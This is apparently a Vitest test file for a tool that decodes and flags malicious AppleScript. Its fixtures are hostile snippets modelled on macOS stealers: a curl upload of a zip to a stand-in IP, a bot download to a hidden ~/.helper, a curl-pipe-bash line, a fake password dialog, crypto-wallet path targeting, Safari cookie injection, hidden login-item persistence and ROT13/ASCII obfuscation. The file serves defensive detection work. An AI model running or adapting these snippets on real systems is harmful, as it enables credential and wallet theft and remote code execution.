import { describe, it, expect } from 'vitest';
import { looksLikeAppleScript, decodeAppleScript } from '../src/applescript';

describe('looksLikeAppleScript', () => {
  it('detects `do shell script`', () => {
    expect(looksLikeAppleScript('do shell script "echo hi"')).toBe(true);
  });
  it('detects `tell application`', () => {
    expect(looksLikeAppleScript('tell application "Finder" to activate')).toBe(true);
  });
  it('does not flag JXA `doShellScript` (camelCase, no spaces)', () => {
    expect(looksLikeAppleScript('app.doShellScript("x")')).toBe(false);
  });
  it('ignores AppleScript keywords that only appear inside a JS string literal', () => {
    expect(looksLikeAppleScript('var note="tell application to relax";eval(atob("x"))')).toBe(false);
  });
  it('detects a bare `set the clipboard to` with no `tell application`/`do shell script` alongside it', () => {
    expect(looksLikeAppleScript('set the clipboard to "curl -fsSL https://example.com/install.sh | bash"')).toBe(true);
  });
});

describe('decodeAppleScript', () => {
  it('extracts a literal `do shell script` command as a shell sink', () => {
    const r = decodeAppleScript('do shell script "echo hi"');
    expect(r.capturedStrings).toContain('echo hi');
    expect(r.events.some((e) => e.kind === 'shell' && e.detail === 'echo hi')).toBe(true);
  });

  it('resolves `&` concatenation and `set` variables', () => {
    const src = 'set u to "https://example.com/x"\nset c to "curl " & u\ndo shell script c';
    expect(decodeAppleScript(src).capturedStrings).toContain('curl https://example.com/x');
  });

  it('drops trailing clauses like `with administrator privileges`', () => {
    const r = decodeAppleScript('do shell script "id" with administrator privileges');
    expect(r.capturedStrings).toContain('id');
  });

  it('unwraps a `set X to (do shell script "…")` wrapper and partials unknown vars', () => {
    const src = 'set r to (do shell script "echo wrapped")\ndo shell script "rm " & mystery';
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('echo wrapped'); // trailing ) stripped, resolved cleanly
    expect(r.capturedStrings).toContain('rm <mystery>'); // unresolved var rendered as a placeholder
  });

  it('cleanly resolves an escaped-quote curl exfil command', () => {
    const src = 'set s to (do shell script "curl -F \\"f=@/tmp/out.zip\\" http://198.51.100.7/x")';
    expect(decodeAppleScript(src).capturedStrings).toContain('curl -F "f=@/tmp/out.zip" http://198.51.100.7/x');
  });

  it('resolves system attribute through path concatenation (Task 2)', () => {
    const src = [
      'set username to (system attribute "USER")',
      'set profile to "/Users/" & username',
      'do shell script "ls " & profile',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('ls /Users/<USER>');
  });

  it('resolves a plain string variable through do shell script (Task 2)', () => {
    const src = [
      'set w to "/tmp/x/"',
      'do shell script "rm -r " & w',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('rm -r /tmp/x/');
  });

  it('does NOT store a list-literal map var; unresolved sink renders placeholder (Task 2)', () => {
    const src = [
      'set m to {{"a", "b"}}',
      'do shell script "echo " & m',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('echo <m>');
  });

});

describe('value evaluator', () => {
  it('resolves a concatenated URL from set-vars', () => {
    const src = [
      'set host to "198.51.100.7"',
      'set botPath to "/tmp/update"',
      'do shell script ("curl -o " & botPath & " https://" & host & "/zxc/app")',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('curl -o /tmp/update https://198.51.100.7/zxc/app');
  });

  it('unwraps `quoted form of` and leaves unknown vars as placeholders', () => {
    const src = 'do shell script ("echo " & quoted form of pwd & " | sudo -S id")';
    expect(decodeAppleScript(src).capturedStrings).toContain('echo <pwd> | sudo -S id');
  });

  it('does not split on `&` inside a string literal', () => {
    const src = 'do shell script "echo a & b"';
    expect(decodeAppleScript(src).capturedStrings).toContain('echo a & b');
  });

  it('resolves `quoted form of` wrapping a nested concat', () => {
    const src = [
      'set username to (system attribute "USER")',
      'set profile to "/Users/" & username',
      'set botUrl to "198.51.100.7"',
      'set botPath to (quoted form of (profile & "/.helper"))',
      'do shell script "curl -o " & botPath & " https://" & botUrl & "/zxc/app"',
      'do shell script "chmod +x " & botPath',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('curl -o /Users/<USER>/.helper https://198.51.100.7/zxc/app');
    expect(r.capturedStrings).toContain('chmod +x /Users/<USER>/.helper');
  });
});

describe('display dialog sink', () => {
  it('captures a credential-phishing display dialog', () => {
    const src = 'set pwd to text returned of (display dialog "macOS needs your password." default answer "" with hidden answer)';
    const r = decodeAppleScript(src);
    expect(r.events.some((e) => e.kind === 'dialog' && e.detail.includes('[captures password]'))).toBe(true);
  });

  it('uses a short <varName> placeholder, not the full unresolved expression, for a var assigned from an unresolvable RHS', () => {
    const src = [
      'set pwd to text returned of (display dialog "macOS needs your password." default answer "" with hidden answer)',
      'do shell script ("echo " & quoted form of pwd & " | sudo -S id")',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('echo <pwd> | sudo -S id');
  });
});

describe('run script recursion', () => {
  it('recovers a run-script argument for recursion', () => {
    const src = ['set inner to "do shell script \\"echo nested-payload\\""', 'run script inner'].join('\n');
    // The `do shell script` text inside the string literal on line 1 is DATA
    // (recovered later via `run script`), not a real sink
    expect(decodeAppleScript(src).capturedStrings).toEqual(['do shell script "echo nested-payload"']);
  });
});

describe('target-artifact enumeration', () => {
  it('enumerates targets from a walletMap {{...}} block with resolved vars', () => {
    const src = [
      'set username to (system attribute "USER")',
      'set profile to "/Users/" & username',
      'set library to "/Users/" & username & "/Library/Application Support/"',
      'set walletMap to {{"Exodus", library & "Exodus/"}, {"Electrum", profile & "/.electrum/wallets/"}}',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(r.targets.find((t) => t.label === 'Exodus')?.path)
      .toBe('/Users/<USER>/Library/Application Support/Exodus/');
    expect(r.targets.find((t) => t.label === 'Electrum')?.path).toContain('.electrum');
  });

  it('yields targets: [] when source has no {{...}} blocks', () => {
    expect(decodeAppleScript('do shell script "echo hello"').targets).toEqual([]);
  });
});

describe('browser-injection sink', () => {
  it('captures `do JavaScript … in` as a browser-injection event', () => {
    const src = ['tell application "Safari"', '\tdo JavaScript "document.cookie" in front document', 'end tell'].join('\n');
    const r = decodeAppleScript(src);
    expect(r.events.some((e) => e.kind === 'browser-injection' && e.detail === 'document.cookie')).toBe(true);
    expect(r.capturedStrings).toContain('document.cookie');
  });
});

describe('gui-scripting sink', () => {
  it('captures a `keystroke` as a gui-scripting event', () => {
    const src = [
      'tell application "System Events"',
      '\ttell process "SecurityAgent"',
      '\t\tkeystroke "AdminPassword123"',
      '\t\tclick button "OK" of window 1',
      '\tend tell',
      'end tell',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(r.events.some((e) => e.kind === 'gui-scripting' && e.detail === 'keystroke AdminPassword123')).toBe(true);
  });
});

describe('login-item persistence sink', () => {
  it('captures `make new login item` as a login-item event', () => {
    const src = [
      'tell application "System Events"',
      '\tmake new login item at end of login items with properties {path:"/tmp/x.app", hidden:true}',
      'end tell',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(
      r.events.some(
        (e) => e.kind === 'login-item' && e.detail.startsWith('make new login item at end of login items'),
      ),
    ).toBe(true);
  });
});

describe('Terminal.app do-script sink', () => {
  it('captures `do script` as a terminal-app event and a shell-recursable capture (#57)', () => {
    const src = [
      'tell application "Terminal"',
      '\tdo script "curl -fsSL https://example.com/install.sh | bash"',
      'end tell',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(
      r.events.some(
        (e) => e.kind === 'terminal-app' && e.detail === 'Terminal do script curl -fsSL https://example.com/install.sh | bash',
      ),
    ).toBe(true);
    expect(r.capturedStrings).toContain('curl -fsSL https://example.com/install.sh | bash');
  });
});

describe('clipboard-injection sink', () => {
  it('captures `set the clipboard to` as a clipboard-write event (#56)', () => {
    const src = 'set the clipboard to "curl -fsSL https://example.com/install.sh | bash"';
    const r = decodeAppleScript(src);
    expect(
      r.events.some(
        (e) => e.kind === 'clipboard-write' && e.detail === 'set the clipboard to curl -fsSL https://example.com/install.sh | bash',
      ),
    ).toBe(true);
  });
});

describe('Mail.app outgoing-message sink', () => {
  it('captures `make new outgoing message` as a mail-compose event (#63)', () => {
    const src = [
      'tell application "Mail"',
      '\tset newMessage to make new outgoing message with properties {subject:"data", content:"stolen secrets"}',
      '\tsend newMessage',
      'end tell',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(
      r.events.some(
        (e) => e.kind === 'mail-compose' && e.detail.startsWith('make new outgoing message with properties'),
      ),
    ).toBe(true);
  });
});

describe('ASCII character arithmetic', () => {
  it('resolves `ASCII character N` string-building to the real command (#46)', () => {
    const src = [
      'set c1 to ASCII character 111',
      'set c2 to ASCII character 112',
      'set c3 to ASCII character 101',
      'set c4 to ASCII character 110',
      'set cmd to c1 & c2 & c3 & c4 & " /tmp/x"',
      'do shell script cmd',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('open /tmp/x');
  });

  it('also resolves the `character id N` spelling', () => {
    const src = 'set c to character id 104\ndo shell script c';
    expect(decodeAppleScript(src).capturedStrings).toContain('h');
  });
});

describe('credential-supplying do shell script', () => {
  it('resolves the command cleanly and surfaces `user name … password …` separately (#48)', () => {
    const src = 'do shell script "curl -o /tmp/update https://198.51.100.7/zxc/app" user name "admin" password pwd with administrator privileges';
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('curl -o /tmp/update https://198.51.100.7/zxc/app');
    expect(r.events.some((e) =>
      e.kind === 'shell' &&
      e.detail.includes('curl -o /tmp/update https://198.51.100.7/zxc/app') &&
      e.detail.includes('credentials supplied') &&
      e.detail.includes('user name admin') &&
      e.detail.includes('password <pwd>')
    )).toBe(true);
  });
});

describe('shell-cipher resolution', () => {
  it('resolves an `echo … | tr SET1 SET2` ROT13 pipe to plaintext (#40)', () => {
    const src = `do shell script "echo 'bcra uggcf://rknzcyr.pbz/oravta/ge-bx' | tr 'A-Za-z' 'N-ZA-Mn-za-m'"`;
    expect(decodeAppleScript(src).capturedStrings).toContain('open https://example.com/benign/tr-ok');
  });

  it('leaves an ordinary do-shell-script command unchanged (not this exact tr-pipe shape)', () => {
    const r = decodeAppleScript('do shell script "echo hi"');
    expect(r.capturedStrings).toContain('echo hi');
  });

  it('composes with the credential-supplying user-name/password clause', () => {
    const src = `do shell script "echo 'bcra uggcf://rknzcyr.pbz/oravta/ge-bx' | tr 'A-Za-z' 'N-ZA-Mn-za-m'" user name "admin" password pwd with administrator privileges`;
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('open https://example.com/benign/tr-ok');
    expect(r.events.some((e) =>
      e.kind === 'shell' &&
      e.detail.includes('open https://example.com/benign/tr-ok') &&
      e.detail.includes('credentials supplied') &&
      e.detail.includes('user name admin') &&
      e.detail.includes('password <pwd>')
    )).toBe(true);
  });
});
